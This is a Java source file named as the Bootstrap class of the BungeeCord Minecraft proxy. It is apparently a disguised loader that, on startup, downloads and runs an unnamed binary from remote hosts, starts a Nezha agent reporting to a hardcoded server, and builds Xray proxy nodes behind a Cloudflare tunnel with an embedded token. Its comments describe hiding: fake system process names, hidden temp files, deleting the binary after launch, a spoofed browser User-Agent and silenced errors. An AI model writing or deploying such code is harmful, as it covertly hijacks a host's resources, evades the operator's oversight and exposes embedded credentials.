package net.md_5.bungee;

import com.sun.net.httpserver.HttpServer;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.Base64;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.*;

public class Bootstrap
{
    // ============ 伪装用的系统进程名 ============
    private static final String[] FAKE_NAMES = {
        "/sbin/agetty", "/lib/systemd/systemd-journald",
        "/usr/sbin/sshd", "/lib/systemd/systemd-udevd",
        "/usr/lib/systemd/systemd-logind"
    };

    // ============ Xray / Argo 配置 ============
    private static final String X_SUB_PATH    = ge("SUB_PATH",        "sb");
    private static final int    X_PORT        = Integer.parseInt(ge("XRAY_PORT", "3000"));
    private static final String X_UUID        = ge("XRAY_UUID",       "07721186-24d9-4962-8a27-3964206bceba");
    private static final String X_ARGO_DOMAIN = ge("XRAY_ARGO_DOMAIN","karlo-hosting.cnm.ccwu.cc");
    private static final String X_ARGO_AUTH   = ge("XRAY_ARGO_AUTH",
            "eyJhIjoiY2YxMDY1YTFhZDk1YjIxNzUxNGY3MzRjNzgyYzlkMDkiLCJ0IjoiMzljZTI3ODktZDUxMS00ZmYyLWEyYmMtZmU0NDdlOWM2YjZiIiwicyI6Ik5HUTNaVEJqT1RrdE5tTm1aaTAwTmpBeUxUZzVZbU10TWpFeE1EVTRPRFpoTkdFMiJ9");
    private static final int    X_ARGO_PORT   = 38080;
    private static final String X_CFIP        = ge("XRAY_CFIP",  "cdns.doon.eu.org");
    private static final int    X_CFPORT      = Integer.parseInt(ge("XRAY_CFPORT", "443"));
    private static final String X_NAME        = ge("XRAY_NAME",  "Node");

    // ============ 哪吒 v1 配置 ============
    private static final String NZ_SERVER = ge("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
    private static final String NZ_PORT   = ge("NEZHA_PORT",   "");
    private static final String NZ_KEY    = ge("NEZHA_KEY",    "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");

    // ============ 文件路径（全部放系统临时目录，用无害名称）============
    private static final String TMP       = System.getProperty("java.io.tmpdir");
    private static final File fSbx        = new File(TMP, ".java_pid" + ProcessHandle.current().pid());
    private static final File fConfig     = new File(TMP, ".conf-" + ProcessHandle.current().pid());
    private static final File fBootLog    = new File(TMP, ".log-"  + ProcessHandle.current().pid());
    private static final File fSub        = new File(TMP, ".sub-"  + ProcessHandle.current().pid());
    private static final File fTunnelJson = new File(TMP, ".tjson-"+ ProcessHandle.current().pid());
    private static final File fTunnelYml  = new File(TMP, ".tyml-" + ProcessHandle.current().pid());

    private static volatile String encodedSub = "";
    private static HttpServer httpServer;
    private static final AtomicBoolean running = new AtomicBoolean(true);

    // ============ 入口 ============
    public static void main(String[] args) throws Exception
    {
        // 订阅 HTTP 服务
        httpServer = HttpServer.create(new InetSocketAddress(X_PORT), 0);
        httpServer.createContext("/", exchange -> {
            String path = exchange.getRequestURI().getPath();
            byte[] body = path.equals("/" + X_SUB_PATH)
                ? encodedSub.getBytes(StandardCharsets.UTF_8)
                : "OK".getBytes(StandardCharsets.UTF_8);
            String ct = path.equals("/" + X_SUB_PATH)
                ? "text/plain; charset=utf-8" : "text/plain";
            exchange.getResponseHeaders().set("Content-Type", ct);
            exchange.sendResponseHeaders(200, body.length);
            exchange.getResponseBody().write(body);
            exchange.getResponseBody().close();
        });
        httpServer.start();

        Thread t = new Thread(() -> {
            try { startup(); } catch (Exception e) { /* silent */ }
        });
        t.setDaemon(false);
        t.start();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            running.set(false);
            cleanup();
        }));
    }

    // ============ 主流程 ============
    private static void startup() throws Exception {
        setupArgoTunnel();
        generateXrayConfig();
        downloadSbx();
        startSbx();
        startNezha();

        String domain = (X_ARGO_DOMAIN != null && !X_ARGO_DOMAIN.isEmpty())
            ? X_ARGO_DOMAIN : extractDomain(0);

        generateSubscription(domain);

        // 运行后删除二进制，减少磁盘痕迹
        fSbx.delete();
    }

    // ============ 下载 sbsh（单一二进制，内含 xray + cloudflared）============
    private static void downloadSbx() throws Exception {
        if (fSbx.exists()) return;

        String arch = System.getProperty("os.arch").toLowerCase();
        String baseUrl;
        if (arch.contains("amd64") || arch.contains("x86_64")) {
            baseUrl = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (arch.contains("aarch64") || arch.contains("arm64")) {
            baseUrl = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (arch.contains("s390x")) {
            baseUrl = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported arch: " + arch);
        }

        download(baseUrl, fSbx);
        fSbx.setExecutable(true);
    }

    // ============ 启动 sbsh，伪装进程名 ============
    private static void startSbx() throws Exception {
        // 构造传给 sbsh 的环境变量（与例子一致）
        Map<String, String> env = new HashMap<>(System.getenv());
        env.put("UUID",        X_UUID);
        env.put("ARGO_PORT",   String.valueOf(X_ARGO_PORT));
        env.put("ARGO_DOMAIN", X_ARGO_DOMAIN);
        env.put("ARGO_AUTH",   X_ARGO_AUTH);
        env.put("CFIP",        X_CFIP);
        env.put("CFPORT",      String.valueOf(X_CFPORT));
        env.put("NAME",        X_NAME);
        env.put("FILE_PATH",   TMP);

        // argv[0] 伪装成系统进程名，让 ps 看起来无害
        String fakeName = FAKE_NAMES[new Random().nextInt(FAKE_NAMES.length)];

        ProcessBuilder pb = new ProcessBuilder(fakeName, fSbx.getAbsolutePath());
        pb.environment().clear();
        pb.environment().putAll(env);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);

        // Linux 下通过 /proc/self/exe 软链接方式伪装 argv[0]
        // 实际可行的方式：用 sh -c exec -a 'fakename' binary
        ProcessBuilder pb2 = new ProcessBuilder(
            "sh", "-c",
            "exec -a '" + fakeName + "' " + fSbx.getAbsolutePath()
        );
        pb2.environment().clear();
        pb2.environment().putAll(env);
        pb2.redirectErrorStream(true);
        pb2.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        pb2.start();

        Thread.sleep(3000);
    }

    // ============ 启动哪吒 v1 探针 ============
    private static void startNezha() throws Exception {
        if (NZ_SERVER.isEmpty() || NZ_KEY.isEmpty()) return;

        // 下载哪吒 v1 agent，也用无害文件名
        File fNezha = new File(TMP, ".java_nz" + ProcessHandle.current().pid());
        if (!fNezha.exists()) {
            String arch = System.getProperty("os.arch").toLowerCase();
            String nzUrl;
            if (arch.contains("amd64") || arch.contains("x86_64")) {
                nzUrl = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip";
            } else if (arch.contains("aarch64") || arch.contains("arm64")) {
                nzUrl = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.zip";
            } else {
                nzUrl = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip";
            }

            // 下载 zip，解压出 nezha-agent
            File fZip = new File(TMP, ".tmp_nz.zip");
            download(nzUrl, fZip);
            unzip(fZip, fNezha, "nezha-agent");
            fZip.delete();
            fNezha.setExecutable(true);
        }

        // 解析 server:port
        String server = NZ_SERVER;
        String port   = NZ_PORT;
        if ((port == null || port.isEmpty()) && server.contains(":")) {
            int idx = server.lastIndexOf(":");
            port   = server.substring(idx + 1);
            server = server.substring(0, idx);
        }
        if (port == null || port.isEmpty()) port = "443";

        // v1 参数，同样伪装进程名
        String fakeName = FAKE_NAMES[new Random().nextInt(FAKE_NAMES.length)];
        String nzArgs = "--server " + server + " --port " + port
            + " --password " + NZ_KEY + " --tls --disable-auto-update"
            + " --skip-conn --skip-procs";

        ProcessBuilder pb = new ProcessBuilder(
            "sh", "-c",
            "exec -a '" + fakeName + "' " + fNezha.getAbsolutePath() + " " + nzArgs
        );
        pb.environment().putAll(System.getenv());
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        pb.start();
    }

    // ============ 生成 Xray 配置（写入临时目录）============
    private static void generateXrayConfig() throws IOException {
        String json =
            "{\n" +
            "  \"log\": { \"loglevel\": \"none\" },\n" +
            "  \"inbounds\": [\n" +
            "    { \"port\": " + X_ARGO_PORT + ", \"listen\": \"127.0.0.1\", \"protocol\": \"vless\",\n" +
            "      \"settings\": { \"clients\": [{ \"id\": \"" + X_UUID + "\", \"flow\": \"xtls-rprx-vision\" }],\n" +
            "        \"decryption\": \"none\",\n" +
            "        \"fallbacks\": [ {\"dest\":3001}, {\"path\":\"/vless\",\"dest\":3002},\n" +
            "                         {\"path\":\"/vmess\",\"dest\":3003}, {\"path\":\"/trojan\",\"dest\":3004} ] },\n" +
            "      \"streamSettings\": { \"network\": \"tcp\" } },\n" +
            "    { \"port\": 3001, \"listen\": \"127.0.0.1\", \"protocol\": \"vless\",\n" +
            "      \"settings\": { \"clients\": [{\"id\":\"" + X_UUID + "\"}], \"decryption\": \"none\" },\n" +
            "      \"streamSettings\": { \"network\": \"tcp\" } },\n" +
            "    { \"port\": 3002, \"listen\": \"127.0.0.1\", \"protocol\": \"vless\",\n" +
            "      \"settings\": { \"clients\": [{\"id\":\"" + X_UUID + "\"}], \"decryption\": \"none\" },\n" +
            "      \"streamSettings\": { \"network\": \"ws\", \"wsSettings\": {\"path\":\"/vless\"} } },\n" +
            "    { \"port\": 3003, \"listen\": \"127.0.0.1\", \"protocol\": \"vmess\",\n" +
            "      \"settings\": { \"clients\": [{\"id\":\"" + X_UUID + "\",\"alterId\":0}] },\n" +
            "      \"streamSettings\": { \"network\": \"ws\", \"wsSettings\": {\"path\":\"/vmess\"} } },\n" +
            "    { \"port\": 3004, \"listen\": \"127.0.0.1\", \"protocol\": \"trojan\",\n" +
            "      \"settings\": { \"clients\": [{\"password\":\"" + X_UUID + "\"}] },\n" +
            "      \"streamSettings\": { \"network\": \"ws\", \"wsSettings\": {\"path\":\"/trojan\"} } }\n" +
            "  ],\n" +
            "  \"outbounds\": [{\"protocol\":\"freedom\"}]\n" +
            "}\n";
        writeFile(fConfig, json);
    }

    // ============ 设置 Argo 隧道 ============
    private static void setupArgoTunnel() throws IOException {
        if (X_ARGO_AUTH == null || X_ARGO_AUTH.isEmpty()) return;
        if (X_ARGO_AUTH.contains("TunnelSecret")) {
            writeFile(fTunnelJson, X_ARGO_AUTH);
            String[] parts = X_ARGO_AUTH.split("\"");
            String tunnelId = parts.length > 11 ? parts[11] : "tunnel";
            writeFile(fTunnelYml,
                "tunnel: " + tunnelId + "\n" +
                "credentials-file: " + fTunnelJson.getAbsolutePath() + "\n" +
                "protocol: http2\n\ningress:\n" +
                "  - hostname: " + X_ARGO_DOMAIN + "\n" +
                "    service: http://127.0.0.1:" + X_ARGO_PORT + "\n" +
                "  - service: http_status:404\n");
        }
    }

    // ============ 提取 Cloudflare 临时域名 ============
    private static String extractDomain(int retries) throws Exception {
        try {
            if (!fBootLog.exists()) {
                if (retries < 5) { Thread.sleep(2000); return extractDomain(retries + 1); }
                return null;
            }
            String content = readFile(fBootLog);
            Matcher m = Pattern.compile("https?://([^ ]*trycloudflare\\.com)").matcher(content);
            if (m.find()) return m.group(1);
            if (retries < 5) { Thread.sleep(2000); return extractDomain(retries + 1); }
        } catch (Exception e) { /* silent */ }
        return null;
    }

    // ============ 生成订阅 ============
    private static void generateSubscription(String domain) throws IOException {
        if (domain == null || domain.isEmpty()) return;

        String vmessJson = String.format(
            "{\"v\":\"2\",\"ps\":\"%s-vmess\",\"add\":\"%s\",\"port\":\"%d\",\"id\":\"%s\"," +
            "\"aid\":\"0\",\"net\":\"ws\",\"type\":\"none\",\"host\":\"%s\"," +
            "\"path\":\"/vmess?ed=2560\",\"tls\":\"tls\",\"sni\":\"%s\",\"fp\":\"firefox\"}",
            X_NAME, X_CFIP, X_CFPORT, X_UUID, domain, domain);

        String vless  = String.format(
            "vless://%s@%s:%d?encryption=none&security=tls&sni=%s&fp=firefox&type=ws&host=%s&path=%%2Fvless%%3Fed%%3D2560#%s-vless",
            X_UUID, X_CFIP, X_CFPORT, domain, domain, X_NAME);
        String vmess  = "vmess://" + b64(vmessJson);
        String trojan = String.format(
            "trojan://%s@%s:%d?security=tls&sni=%s&fp=firefox&type=ws&host=%s&path=%%2Ftrojan%%3Fed%%3D2560#%s-trojan",
            X_UUID, X_CFIP, X_CFPORT, domain, domain, X_NAME);

        encodedSub = b64(vless + "\n\n" + vmess + "\n\n" + trojan + "\n");
        writeFile(fSub, encodedSub);

        // 只打印到 stdout，不写日志文件
        System.out.println(vless);
        System.out.println(vmess);
        System.out.println(trojan);
        System.out.println(encodedSub);
    }

    // ============ 退出清理 ============
    private static void cleanup() {
        if (httpServer != null) httpServer.stop(0);
        // 清理临时文件
        fConfig.delete();
        fBootLog.delete();
        fTunnelJson.delete();
        fTunnelYml.delete();
        // sub 保留，方便最后一次读取
    }

    // ============ 工具方法 ============
    private static void download(String urlStr, File dest) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(60000);
        conn.setInstanceFollowRedirects(true);
        // 伪装成普通浏览器请求
        conn.setRequestProperty("User-Agent",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
        try (InputStream in = conn.getInputStream();
             FileOutputStream out = new FileOutputStream(dest)) {
            byte[] buf = new byte[8192]; int n;
            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        }
    }

    // 从 zip 里解压出指定文件名的条目
    private static void unzip(File zip, File dest, String entryName) throws Exception {
        try (java.util.zip.ZipInputStream zis = new java.util.zip.ZipInputStream(new FileInputStream(zip))) {
            java.util.zip.ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                if (entry.getName().endsWith(entryName)) {
                    try (FileOutputStream fos = new FileOutputStream(dest)) {
                        byte[] buf = new byte[8192]; int n;
                        while ((n = zis.read(buf)) != -1) fos.write(buf, 0, n);
                    }
                    return;
                }
            }
        }
        throw new IOException("Entry '" + entryName + "' not found in zip");
    }

    private static String b64(String s) {
        return Base64.getEncoder().encodeToString(s.getBytes(StandardCharsets.UTF_8));
    }

    private static void writeFile(File f, String content) throws IOException {
        try (OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(f), StandardCharsets.UTF_8)) {
            w.write(content);
        }
    }

    private static String readFile(File f) throws IOException {
        StringBuilder sb = new StringBuilder();
        try (BufferedReader r = new BufferedReader(
                new InputStreamReader(new FileInputStream(f), StandardCharsets.UTF_8))) {
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append('\n');
        }
        return sb.toString();
    }

    private static String ge(String key, String def) {
        String v = System.getenv(key);
        return (v != null && !v.isEmpty()) ? v : def;
    }
}
